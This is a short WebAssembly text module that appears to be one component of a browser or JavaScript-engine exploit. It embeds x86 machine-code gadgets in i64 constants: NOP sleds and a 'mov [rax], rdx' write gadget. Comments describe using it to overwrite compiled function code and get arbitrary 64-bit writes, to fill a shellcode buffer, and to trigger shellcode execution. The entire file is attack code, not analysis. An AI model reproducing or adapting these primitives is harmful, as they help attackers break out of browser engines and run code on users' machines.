(module
  (memory 1)

  (func $arb_write_gadget (export "arb_write_gadget")
    (result i64)
    i64.const 0x90909090_90108948 ;; mov QWORD PTR [rax], rdx;
  )

  ;; We use this function to overwrite the begining arb_write64 with the arb_write_gadget = mov QWORD PTR [rax], rdx;
  (func $arb_write64_one_shot (export "arb_write64_one_shot")
    (param $addr i64)  ;; Address to write to (rax)
    (param $value i64) ;; 64-bit integer to write (rdx)
    (result i64)
    
    i64.const 0x90909090_90909090
  )

  ;; This one is the multishot version of the previous one
  (func $arb_write64 (export "arb_write64")
    (param $addr i64)  ;; Address to write to (rax)
    (param $value i64) ;; 64-bit integer to write (rdx)
    (result i64)
    
    i64.const 0x90909090_90909090
  )

  ;; This one is the location where we will write the shellcode
  (func $shellcode_buffer (export "shellcode_buffer")
    (result i64)
    i64.const 0x90909090_90909090
  )

  ;; This function will trigger the shellcode execution
  (func (export "exec_shellcode")
    nop
  )
)